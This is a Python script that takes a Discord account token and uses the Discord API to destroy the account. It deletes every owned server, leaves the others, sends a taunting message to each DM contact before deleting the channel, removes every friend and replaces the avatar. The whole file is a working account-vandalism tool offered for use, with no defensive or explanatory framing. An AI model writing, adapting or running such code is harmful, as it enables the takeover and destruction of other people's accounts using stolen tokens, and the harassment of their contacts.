import requests, base64, asyncio, json

class Destruction:
    def __init__(self, token): 
        self.token = token
        self.message = { "content": "", "tts": "false", "embed": { "description": "This account got fucked...... " } }
        self.session = requests.Session()
        self.api = "https://discordapp.com/api/v6/"
    def headers(self):
        return {"content-type": "application/json","authorization": self.token,'access-control-allow-headers': 'Content-Type, Authorization'}

    def checkToken(self):
        _data = self.session.get(self.api + "users/@me", headers=self.headers())
        if _data.status_code == 400 or _data.status_code == 401:
            return False
        elif _data.status_code <= 204:
            return True

    async def deleteGuilds(self):
        _guilds = self.session.get(self.api + 'users/@me/guilds', headers=self.headers()).json()
        print(_guilds)
        for _guild in _guilds:
            if _guild['owner'] == True:
                print(f" > Deleted an owned guild: {_guild['name']}")
                self.session.post(self.api + f"guilds/{_guild['id']}/delete", json={}, headers=self.headers())
            elif _guild['owner'] == False:
                print(f" > Left a guild: {_guild['name']}")
                self.session.delete(self.api + f"users/@me/guilds/{_guild['id']}", headers={"authorization": self.token})

    async def deleteFriends(self):
        _friends = self.session.get(self.api + 'users/@me/relationships', headers=self.headers()).json()
        for _friend in _friends:
            self.session.delete(self.api + f"users/@me/relationships/{_friend['id']}", headers=self.headers())
            print(f" > Removed friend: {_friend['user']['username']}")

    async def deleteDms(self):
        _dms = self.session.get(self.api + "users/@me/channels", headers=self.headers()).json()
        for _channel in _dms:
            self.session.post(self.api + f'channels/{_channel["id"]}/messages', json=self.message, headers=self.headers())
            print(f" > Deleting dm channel of {_channel['recipients'][0]['username']}")
            _data = self.session.delete(self.api + f"channels/{_channel['id']}", headers=self.headers())

    async def setAvatar(self):
        _info = self.session.get(self.api + "users/@me", headers=self.headers()).json()
        email = _info['email']
        username = _info['username']
        avatar = base64.b64encode(open("../pfp.png", "rb").read()).decode("utf-8")
        _payload = {"avatar": f"data:image/jpeg;base64,{avatar}","discriminator": None,"email": email,"new_password": None,"password": "","username": username}
        self.session.patch(self.api + "users/@me", json=_payload, headers=self.headers())
        print(f" > Changed avatar.")

    async def start(self):
        if self.checkToken() == False:
            return

        await self.deleteGuilds()
        await self.setAvatar()
        await self.deleteDms()
        await self.deleteFriends()


if __name__ == "__main__":
    token = str(input("> "))
    asyncio.run(Destruction(token).start())
